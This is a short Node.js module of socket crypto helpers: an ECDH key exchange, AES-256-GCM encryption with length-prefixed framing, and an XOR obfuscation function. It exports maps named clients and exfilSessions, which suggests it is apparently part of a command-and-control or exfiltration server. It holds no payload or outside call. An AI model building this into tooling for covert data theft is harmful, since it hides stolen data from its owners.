const crypto = require("crypto");

const clients = new Map();
const clientKeys = new Map();
const exfilSessions = new Map();

function xorCrypt(data, key) {
    const out = Buffer.alloc(data.length);
    for (let i = 0; i < data.length; i++) out[i] = data[i] ^ key.charCodeAt(i % key.length);
    return out;
}

function rawPointToSpki(raw) {
    if (!Buffer.isBuffer(raw) || raw.length !== 65 || raw[0] !== 0x04) {
        throw new Error("invalid raw EC point");
    }
    const x = raw.subarray(1, 33);
    const y = raw.subarray(33, 65);
    const jwk = {
        kty: "EC",
        crv: "P-256",
        x: Buffer.from(x).toString("base64url"),
        y: Buffer.from(y).toString("base64url"),
    };
    const key = crypto.createPublicKey({ key: jwk, format: "jwk" });
    return key.export({ format: "der", type: "spki" });
}

function performKeyExchange(sock, callback) {
    const ecdh = crypto.createECDH("prime256v1");
    const serverRawPub = ecdh.generateKeys();
    const serverPubKey = rawPointToSpki(serverRawPub);
    const header = Buffer.alloc(4);
    header.writeUInt32BE(serverPubKey.length, 0);
    sock.write(Buffer.concat([header, serverPubKey]));

    let state = { ecdh, buf: Buffer.alloc(0), expecting: true, len: 0 };
    sock.on("data", function keyexChunk(raw) {
        state.buf = Buffer.concat([state.buf, raw]);
        if (state.expecting) {
            if (state.buf.length < 4) return;
            state.len = state.buf.readUInt32BE(0);
            state.buf = state.buf.subarray(4);
            state.expecting = false;
        }
        if (state.buf.length >= state.len) {
            const clientPubKey = state.buf.subarray(0, state.len);
            const leftover = state.buf.subarray(state.len);
            sock.removeListener("data", keyexChunk);
            const sharedSecret = ecdh.computeSecret(clientPubKey);
            const aesKey = crypto.createHash("sha256").update(sharedSecret).digest();
            callback(aesKey, leftover);
        }
    });
}

function aesEncrypt(data, key) {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
    const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
    const tag = cipher.getAuthTag();
    return Buffer.concat([iv, tag, encrypted]);
}

function aesDecrypt(data, key) {
    const iv = data.subarray(0, 12);
    const tag = data.subarray(12, 28);
    const ciphertext = data.subarray(28);
    const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
    decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(ciphertext), decipher.final()]);
}

function sendFramed(sock, payload, aesKey) {
    const json = Buffer.from(JSON.stringify(payload));
    const encrypted = aesKey ? aesEncrypt(json, aesKey) : json;
    const header = Buffer.alloc(4);
    header.writeUInt32BE(encrypted.length, 0);
    sock.write(Buffer.concat([header, encrypted]));
}

module.exports = { clients, clientKeys, exfilSessions, xorCrypt, performKeyExchange, aesEncrypt, aesDecrypt, sendFramed };
